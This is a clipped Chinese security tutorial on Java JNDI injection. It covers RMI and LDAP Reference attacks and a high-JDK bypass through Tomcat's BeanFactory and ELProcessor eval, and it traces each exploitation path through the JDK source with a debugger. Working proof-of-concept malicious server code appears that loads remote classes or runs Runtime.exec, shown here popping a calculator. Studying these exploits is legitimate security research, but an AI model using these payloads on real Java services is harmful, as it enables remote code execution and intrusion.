---
title: JNDI注入从不会到彻底放弃
url: https://mp.weixin.qq.com/s?__biz=MzkzMTM3OTA0NQ==&mid=2247484191&idx=1&sn=21afb5f83df223a2836f4e464a256882&chksm=c26aa115f51d28036a40626ed7d2e4dcb5afef24fa3afcba8f2306939055ba718868fe8fbb70&mpshare=1&scene=1&srcid=0314Hnda1WExA3hfhKuKWX1c&sharer_shareinfo=6946968ef952ac64a01f527174f5eb2e&sharer_shareinfo_first=6946968ef952ac64a01f527174f5eb2e#rd
clipped_at: 2024-03-31 16:03:58
category: temp
tags: 
 - mp.weixin.qq.com
---


# JNDI注入从不会到彻底放弃

## 基本概念

> Java的JNDI（Java Naming and Directory Interface）是一种标准API，可用于访问和管理分布式应用程序中的命名和目录服务。
> 
> JNDI为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。

通过JNDI，Java应用程序可以：

1.  查找和获取命名对象，例如数据库连接、远程对象和配置信息。
    
2.  将对象绑定到名称下，并使用这些名称来查找对象。
    
3.  访问基于目录的服务，例如LDAP（Lightweight Directory Access Protocol）或者 DNS（Domain Name System）服务。
    
4.  实现自定义的命名代理，并且根据需要将其集成进JNDI体系结构中。
    

JNDI主要支持：DNS、RMI、LDAP、CORBA等服务，JNDI类似一组API接口，每个对象都有一组名字和对象绑定关系，通过查找名字即可检索到相关的对象。

![图片](assets/1711872238-d3450e080dd97d3a6be5a22beb45721c.webp)

### 影响版本

| 协议  | JDK6 | JDK7 | JDK8 | JDK11 |
| --- | --- | --- | --- | --- |
| LADP | 6u141、6u211之前版本 | 7u201、7u131之前版本 | 8u121、8u191之前版本 | JDK11.0.1之前版本 |
| RMI | 6u45、6u141、6u211之前版本 | 7u21、7u131、7u201之前版本 | 8u121、8u191之前版本 | 无   |

## JNDI注入

### RMI Reference攻击

`com.sun.jndi.rmi.object.trustURLCodebase`

`java.rmi.server.useCodebaseOnly`

`com.sun.jndi.cosnaming.object.trustURLCodebase`

![图片](assets/1711872238-0cdd271dd9b9673bed6b1005b503e871.webp)

恶意服务端代码如下：

```plain
package JNDIResearch;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIRMIServer {
    public static void main(String[] args) throws NamingException, RemoteException {
        InitialContext initialContext = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);
        // Reference类构建一个远程引用对象，该引用对象类名为exp，类工厂名为exp，类工厂位置为 http://127.0.0.1:8080/
        Reference reference = new Reference("exp","exp","http://127.0.0.1:8080/");
        initialContext.bind("rmi://127.0.0.1:1099/exp",reference);
    }
}
```

受害者服务端 `lookup` 参数可控导致可以查找恶意服务RMI

```plain
package JNDIResearch;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.rmi.RemoteException;

public class JNDIRMIClient {
    public static void main(String[] args) throws NamingException, RemoteException {
        InitialContext initialContext = new InitialContext();
        initialContext.lookup("rmi://127.0.0.1:1099/exp");
    }
}
```

编写一个exp.java程序用于弹出计算器，将该程序进行编译，再在当前目录下开启一个web服务

![图片](assets/1711872238-c167c13afa12a38a80ee07383c6a2afa.webp)

![图片](assets/1711872238-861a452fbf8bdfe092ea71013c25dd2a.webp)

![图片](assets/1711872238-173ffc48a3af1a8c11501662e552b0e3.webp)

最后成功通过RMI Reference实现JNDI注入，执行恶意代码

### RMI Reference攻击利用分析

![图片](assets/1711872238-1e169da1747275c91e389902aae12c04.webp)

分别在上面两行打上断点，先看一下Reference类引用对象的实例化做了什么，再看重点 `bind` 方法

![图片](assets/1711872238-2e16dc272f5aa64e033af5d4b403d808.webp)

实例化Reference远程引用对象，这里没什么需要注意看的，就只是创建了一个Reference类的引用对象，分别给类名、类工厂名、类工厂位置进行了赋值

![图片](assets/1711872238-078cf35f99fb774c1732b2a0df5b308c.webp)

这里需要重点关注的入口是 `bind` 方法，跟进看一下

![图片](assets/1711872238-45b1b68ce5114c464823b7953d8a121d.webp)

![图片](assets/1711872238-e7b67175d6e7b5dd435e8e6672d3f411.webp)

![图片](assets/1711872238-7848383375e1faf030d31d406c654340.webp)

这里将 `Reference` 引用对象和类名 `exp` 作为 `encodeObject` 方法的参数并调用，跟进去看一下

![图片](assets/1711872238-aa6aad28125d1ecf2af8a0f72abfbef0.webp)

这里将前面实例化的Reference类型对象进行实例化 `ReferenceWrapper` 类型对象

![图片](assets/1711872238-6522e0431f6b4a83f5b4a47cdb80ad2c.webp)

到了这里 `bind` 方法就结束了，已经将 `ReferenceWrapper` 类型的引用对象绑定到RMI注册表中指定名称 `exp` 上，恶意服务端的RMI指定名称上已经绑定了我们的恶意代码引用对象

![图片](assets/1711872238-13b3b215e2eeb702c7381d5c295ac6ec.webp)

在受害者服务端这边，让其查找我们的恶意RMI服务，跟进lookup方法往下看

![图片](assets/1711872238-700acecd93f7c2d339743a4b456ddcca.webp)

![图片](assets/1711872238-51f746ca244f32ada26fe4bb6d930f13.webp)

![图片](assets/1711872238-068dbac15bcab7e38a3f46f51fa7a129.webp)

这里使用RMI查找绑定指定名称 `exp` 的远程对象

![图片](assets/1711872238-b7844757d26c1548ea1fdf158507467e.webp)

这里调用了 `decodeObject` 方法，因为在恶意服务端那边将默认的Reference进行了 `encodeObject` 方法之后返回了 `ReferenceWrapper` 类型引用对象，所以这边需要调用 `decodeObject` 方法获取原来的 `Reference` 类型引用对象。

![图片](assets/1711872238-579775d1563eb001aa941ebc19630e61.webp)

这里将 `ReferenceWrapper` 类型引用对象变量 `r` 强转为 `RemoteReference` 类型远程引用对象并调用 `getReference` 获取 `Reference` 类型引用对象，又变回在恶意服务端那边的 `Reference` 对象

![图片](assets/1711872238-b9f9a3b3b098c99da0744421d47d3aec.webp)

这里调用了 `NamingManager` 类的 `getObjectInstance` 静态方法，跳到了 `NamingManager` 类中，继续跟进

![图片](assets/1711872238-049594aa78ec7067e3e9ee5af793f2b5.webp)

这里获取的是一个为null值的ObjectFactoryBuilder对象

![图片](assets/1711872238-e0099b9dc03d3f999637fd66de0f8fc7.webp)

这里将传入参数 `refInfo` 的 `Reference` 类型引用对象赋值给了ref变量

![图片](assets/1711872238-b43edc9ef7eb8ece77969112aebd1685.webp)

这里从 `Reference` 类型引用对象中获取指定类的对象工厂，跟进看一下

![图片](assets/1711872238-1cd0a4abb4cee653f5b5d673c309f124.webp)

这里进行了类加载操作，是从本地查找 `exp` 类

![图片](assets/1711872238-6fcc9781b1774ef2d972d7a7f4e6912e.webp)

这里使用的加载器是 `AppClassLoader`，`AppClassLoader` 会加载当前应用程序所在的类路径下的类，包括应用程序的类和第三方库的类，那肯定是找不到这个 `exp` 类的

![图片](assets/1711872238-6737d59dda8a905eaa7d6db4a5236822.webp)

来到这里，获取了 `Reference` 类型引用对象的类工厂位置，就是前面的远程地址 `http://127.0.0.1:8080/`

![图片](assets/1711872238-932514dd5db621245b33388ed6a4a9ff.webp)

这里使用 `URLClassLoader` 加载器实例化对象获得一个 `FactoryClassLoader` 加载器

![图片](assets/1711872238-fac156d32b8883b2a76017b96e341b9f.webp)

最后使用 `FactoryURLClassLoader` 加载器远程加载了 `exp` 类，这个时候就请求了 `http://127.0.0.1:8080/exp.class` 地址了

![图片](assets/1711872238-ad583378fce978a9c05558f94670cd53.webp)

通过 `FactoryURLClassLoader` 加载到了 `exp` 类后，实例化了 `exp` 类，在我们写的恶意代码 `exp.java` 中在无参构造方法写入了执行命令弹出计算器

![图片](assets/1711872238-44fb060138356df7f442d54f417463d2.webp)

在实例化对象时，会默认调用无参的构造方法，最终成功使用RMI Reference执行命令

### LDAP Reference攻击

上面，我们使用RMI Reference进行了远程加载恶意类，但是仅限于JDK8u121以下版本，在8u121及以后版本针对了对RMI远程加载的漏洞修复

![图片](assets/1711872238-98998e42db470394ee62fee7d585539c.webp)

在JDK8u121及以后版本，在RMI相关操作上增加了 `trustURLCodebase` 系统属性，该属性值默认为 `false`，要想修改必须设置系统属性，这样上面的例子就不能进行远程加载恶意代码了。

但是修复了RMI上的远程加载问题，LDAP还没有解决，在上面我们分析RMI Reference利用时发现，真正的远程加载其实是在 `NamingManager` 的 `getObjectInstance` 的方法中，在这之前不过只是对远程引用对象处理，不是只有RMI才可以绑定引用对象，LDAP一样可以，官方当时没有在JDK8u121版本对LDAP进行修复，这样就绕过了上面的修复方式

受害者服务端使用 `ldap` 协议

```plain
package JNDIResearch;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.rmi.RemoteException;

public class JNDILDAPClient {
    public static void main(String[] args) throws NamingException, RemoteException {
        InitialContext initialContext = new InitialContext();
        initialContext.lookup("ldap://127.0.0.1:10389/cn=test,dc=example,dc=com");
    }
}
```

这里创建LDAP服务使用Apache Directory Studio软件进行创建，该软件需要在JDK11版本使用，JDK8和JDK17版本可能会出现问题。不想使用这种方式也可以使用 `JNDIExploit`、`marshalsec` 等工具生成一个LDAP服务

![图片](assets/1711872238-b5b3821f97ef82bdbb1ee2d7e5e8b349.webp)

![图片](assets/1711872238-179754096a998fb12681530c8f6f22e0.webp)

![图片](assets/1711872238-f0a91e90e087a9a7811bfcffccbba24b.webp)

![图片](assets/1711872238-a4d01ad238328775b8fd6d38b6b98f10.webp)

点击创建一个连接

![图片](assets/1711872238-f22c7c1e10d2210c2773c5a987d8a2f1.webp)

![图片](assets/1711872238-08d3737a374985491a3963ee9525e71e.webp)

![图片](assets/1711872238-ae8e2a601160d3df61c14c573a81440a.webp)

选择 `javaContainer`、`javaNamingReference`、`javaObject`、`top`

![图片](assets/1711872238-171e3d0634de277beb251c438c6487f6.webp)

![图片](assets/1711872238-4d774b6846db33c2937da2764591b148.webp)

填写好对应类名、代码库地址、类工厂名即可

![图片](assets/1711872238-384148d13a3fd3447e518481edf6f933.webp)

在受害者服务端运行代码即可执行恶意代码

### LDAP Reference攻击利用分析

![图片](assets/1711872238-4422a55261dfc4eaecbac8e165a328a6.webp)

在受害者服务端的 `lookup` 上打断点调试即可

![图片](assets/1711872238-706e058efa2735c44f61d973f874ec44.webp)

![图片](assets/1711872238-459ebf775cc5985d18e2f3b14127fe1b.webp)

这里调用了该类的父类的 `lookup` 方法

![图片](assets/1711872238-eff6fb058bf3cbbc4178f946f52253c8.webp)

这里上面RMI利用类似，获取URL上下文并获取解析后的对象强转成Context类型的对象

![图片](assets/1711872238-f676a2f85cd93b86c5e674bc31be1392.webp)

![图片](assets/1711872238-da0190bcbf0613e37781586c7327b205.webp)

![图片](assets/1711872238-799fa0668a51acacae81cfe565a033fa.webp)

![图片](assets/1711872238-494e0b826d824bcf1bf9c88d7bae76c6.webp)

在这里获取到了LDAP服务上的属性，也就是我们在LDAP加的那几个属性

![图片](assets/1711872238-b454d8e81f8b4a248764cac039fb5470.webp)

这里判断LDAP服务属性中有没有 `javaclassname` 属性

![图片](assets/1711872238-14953a5d7e13ab337e9951d7d2937a63.webp)

这里都是获取属性的操作，没有设置这些属性，下面的判断都不符合

![图片](assets/1711872238-02729b759f48c085feccdfa5ef3f1826.webp)

将LDAP属性和代码库位置作为参数调用了 `decodeReference` 方法

![图片](assets/1711872238-f861cfdfe8ef642dfe158f6fac99c3fb.webp)

这里获取到了类名和类工厂名，随后将类名和工厂名作为参数实例化 `Reference` 类型引用对象

![图片](assets/1711872238-42aba8631f784ad12ac80d5a9915e28b.webp)

![图片](assets/1711872238-d4fa21059b0d9806306c10826cc219e9.webp)

由于后面没有符合条件，就返回了这个引用对象

![图片](assets/1711872238-96d33d58e32c40bf6e0e01e7b036b31d.webp)

此时，变量 `obj` 就是一个 `Reference` 类型引用对象

![图片](assets/1711872238-2869cc4d6dca5dd144b3976889e0ff38.webp)

再往下走，发现调用了 `DirectoryManager.getObjectInstance` 静态方法，继续跟进看一下

![图片](assets/1711872238-8e3ec3fe108714c66fe4676839d9cb0a.webp)

这里感觉似曾相识，和上面RMI利用那一块很像

![图片](assets/1711872238-8c79943db424d44be71bfc708c2f50c3.webp)

从引用对象中获取类工厂名，然后再从引用对象中获取工厂对象，再跟进

![图片](assets/1711872238-bf9500d4143074f009ae95ba422ae3bb.webp)

这里进行了类加载，跟进看一下

![图片](assets/1711872238-48c223e5f7b6aa3fbd11aa5d6abde8cd.webp)

这里使用了AppClassLoader查找类进行加载，当然是没有的

![图片](assets/1711872238-4eb620466848182f12726e70271e0511.webp)

再到这里获取了代码库的地址，尝试远程加载代码库中的类工厂

![图片](assets/1711872238-43c8bb87ae97659f0df4f3293a09c675.webp)

这里就获得了一个 `FactoryURLClassLoader` 加载器，再使用这个加载器远程加载类

![图片](assets/1711872238-820e7abba80cd2f095245ac60380118b.webp)

这里对加载到的类进行实例化，即实例化了恶意类

![图片](assets/1711872238-04274865d9a6abe5e6d3b76bedce7c43.webp)

最后，成功使用LDAP Reference绕过执行恶意代码

### 高版本JDK绕过

在JDK6u211、7u201、8u191、11.0.1版本及以后，默认将 `com.sun.jndi.ldap.object.trustURLCodebase` 选项设置为false

但不管怎么禁止，我们还是可以通过本地的 `Factory` 类执行命令，在上面我们知道，真正在执行命令的地方其实是在调用 `getObjectInstance()` 方法的时候，使用RMI时调用的是 `NamingManager.getObjectInstance()` 方法，使用LDAP时使用的是 `DirectoryManager.getObjectInstance()` 方法

这两个 `getObjectInstance()` 方法有个共同点，都会从引用对象中获取一个对象工厂，而这个对象工厂只需要可以实例化类并调用方法，且类名、属性、属性值等参数都来自于 `Reference` 类型引用对象，是我们可控即可。而我们要利用的 `Factory` 类必须实现了 `javax.naming.spi.ObjectFactory` 接口，并且实现该接口的 `getObjectInstance()` 方法

根据上面的条件，找到了 `org.apache.naming.factory.BeanFactory` 类，这个类符合上面的条件，在Tomcat依赖包中。该类 `getObjectInstance()` 方法通过反射实例化Reference引用对象指向的类，调用setter方法。

依赖项：

```plain
<dependency>
    <groupId>org.apache.tomcat.embed</groupId>
    <artifactId>tomcat-embed-core</artifactId>
    <version>8.5.58</version>
</dependency>
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-catalina</artifactId>
    <version>8.5.58</version>
</dependency>
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-jasper-el</artifactId>
    <version>8.5.58</version>
</dependency>
```

恶意服务端代码如下：

```plain
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIBypassServer {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry( 1099);
        // 实例化ResourceRef资源引用对象，指定资源类名为javax.el.ELProcessor，资源工厂类名为org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        // 在资源引用对象中添加一个字符串类型引用地址，传递引用类型和引用值参数
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator')"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("exp", referenceWrapper);
    }
}
```

受害者服务端如下：

```plain
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.net.MalformedURLException;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;

public class JNDIBypassClient {
    public static void main(String[] args) throws MalformedURLException, NotBoundException, RemoteException, NamingException {
        InitialContext initialContext = new InitialContext();
        initialContext.lookup("rmi://127.0.0.1:1099/exp");
    }
}
```

![图片](assets/1711872238-b31dedb94afd1e54e5460b84856568fd.webp)

### 高版本JDK绕过利用分析

![图片](assets/1711872238-03d8623fc610b0fbcd6878f7e1323bf2.webp)

![图片](assets/1711872238-437c70ff481edf2f61e9b9edd76f35ae.webp)

![图片](assets/1711872238-f55393fc304af5fcfa57a5c50e5b270f.webp)

这里其实也没什么好讲的了，最终要在RMI服务上查找指定名称

![图片](assets/1711872238-9518fade17a0d85b4aeb5b3ffed52c3c.webp)

这里获取了一个 `ReferenceWrapper` 类型引用对象，和前面讲过的一样，需要调用`decodeObject` 方法来返回一个 `Reference` 类型引用对象，继续跟进

![图片](assets/1711872238-a93e1677ed986485699570d957747a55.webp)

这里的操作和前面讲的都差不多，不再过多解释

![图片](assets/1711872238-34217aba389bda93b654cc71f809ac0d.webp)

来到这里，调用 `NamingManager.getObjectInstance()` 静态方法

![图片](assets/1711872238-8078a04330509d44f73968c8c9164b79.webp)

![图片](assets/1711872238-bed273cf18c237e7fab3d9d1e71c8532.webp)

这里就真正的调用了 `org.apache.naming.factory.BeanFactory` 类的 `getObjectInstance()`静态方法，继续跟进看一下

![图片](assets/1711872238-0af7a0297d518389140e9701f5396d93.webp)

这里的变量 `obj` 就是一个 `ResourceRef` 资源引用对象

![图片](assets/1711872238-1a79b7573d1cf166197b8e35ed71b0a8.webp)

通过 `AppClassLoader` 加载器加载了 `javax.el.ELProcessor` 类

![图片](assets/1711872238-fbdb76844b974e8fdb611eea4d2ed927.webp)

这里通过反射获取上面的加载到的 `javax.el.ELProcessor` 的构造器进行实例化，获取了一个 `javax.el.ELProcessor` 对象

![图片](assets/1711872238-455341c1e7e29877155272df606dbea0.webp)

这里的操作其实就是获取了引用对象的 `forceString` 引用类型的值，也就是 `x=eval`，这里用逗号分隔成数组，应该是可以使用逗号传递多个引用值的，这里只有一个，然后就是获取了 `=` 这个字符出现的位置

![图片](assets/1711872238-e646f05dccccc0cd7a1281472a774de8.webp)

再往下，就是获取了 `=` 字符前面和后面的字符串，分别是eval和x，forced是个HashMap类型的，把x作为键，通过反射获取 `javax.el.ELProcessor` 的eval方法作为值添加进去

![图片](assets/1711872238-9eede510b4d1f8871c45979d8fdb2380.webp)

![图片](assets/1711872238-f15e1795f9cb54835f50da986e967ed7.webp)

这里获取了引用对象中的所有引用地址

![图片](assets/1711872238-a88c851b796b6b9c6c608798f5be779b.webp)

![图片](assets/1711872238-1bb6b78ec1158bb62441969f3db7daf7.webp)

再继续往下就是一直循环判断引用类型是否匹配，匹配的话就跳出循环进行下一次循环，否则继续往下执行。直到遍历到x引用类型，不匹配，则往下执行

![图片](assets/1711872238-5e0fd1fab52a034375187584ba23f60a.webp)

获取了x引用类型的引用值后，又获取了在上面forced的x键值，也就是eval方法

在211行真正的进行了方法调用，变量 `bean` 就是 `javax.el.ELProcessor` 实例化的对象，valueArray则是x引用地址的引用值，也就是需要执行的恶意命令，通过反射进行了方法调用

![图片](assets/1711872238-df9d18fb9b9d779cd04db0b44f732339.webp)

最后，调用后成功执行了我们恶意服务端上的代码

## 参考链接

https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/ 浅析JNDI注入 \[ Mi1k7ea \]

https://xz.aliyun.com/t/10671 高版本JDK下的JNDI注入浅析 - 先知社区

https://tttang.com/archive/1405 探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖